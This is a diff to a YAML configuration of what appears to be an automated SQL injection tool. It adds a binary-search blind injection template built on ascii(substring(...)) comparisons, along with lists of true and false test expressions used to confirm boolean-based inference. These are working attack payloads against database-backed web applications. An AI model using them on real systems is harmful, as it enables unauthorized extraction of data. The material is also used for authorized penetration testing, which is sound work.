@@ -305,6 +305,31 @@ strategy:
         )
     )
     %26${bit}
+   binary: |
+    ascii(
+        substring(
+            ${injection},
+            ${window.char},
+            1
+        )
+    )
+    %3E%3Dascii('${mid}')
+   truthyBinary:
+    - ascii('a')%3E%3Dascii('a')
+    - ascii('a')%3E%3Dascii('A')
+    - ascii('a')%3E%3Dascii('0')
+    - ascii('b')%3E%3Dascii('a')
+    - ascii('b')%3E%3Dascii('B')
+    - ascii('b')%3E%3Dascii('0')
+    - ascii('1')%3E%3Dascii('0')
+   falsyBinary:
+    - ascii('a')%3E%3Dascii('b')
+    - ascii('A')%3E%3Dascii('a')
+    - ascii('B')%3E%3Dascii('b')
+    - ascii('B')%3E%3Dascii('a')
+    - ascii('0')%3E%3Dascii('b')
+    - ascii('0')%3E%3Dascii('A')
+    - ascii('0')%3E%3Dascii('1')
   modeAnd: and
   modeOr: or
   modeStack: ; select 1 where
